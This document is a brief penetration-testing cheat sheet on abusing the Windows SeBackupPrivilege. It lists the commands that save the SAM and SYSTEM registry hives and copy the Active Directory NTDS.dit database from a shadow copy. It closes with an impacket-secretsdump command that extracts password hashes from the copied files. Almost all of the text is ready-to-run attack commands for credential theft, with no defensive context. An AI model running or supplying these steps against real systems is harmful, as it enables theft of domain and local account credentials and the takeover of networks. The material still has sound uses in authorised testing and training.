# SeBackupPrivilege

```powershell
# Abusing SeBackupPrivilege (launch as administrator if RDP)
reg save hklm\sam C:\ProgramData\System\sam && reg save hklm\system C:\ProgramData\System\system
```

If we are working with Active Directory, we also need its database, [NTDS.dit](https://windowstechno.com/what-is-ntds-dit/).

```powershell
# Using robocopy to copy from shadow copy
robocopy /b P:\Windows\ntds\ C:\ProgramData\System\ ntds.dit
```

**Back in Kali**

```bash
# Dump SAM and NTDS
impacket-secretsdump -sam SAM.save -system SYSTEM.save -ntds ntds.dit LOCAL
```
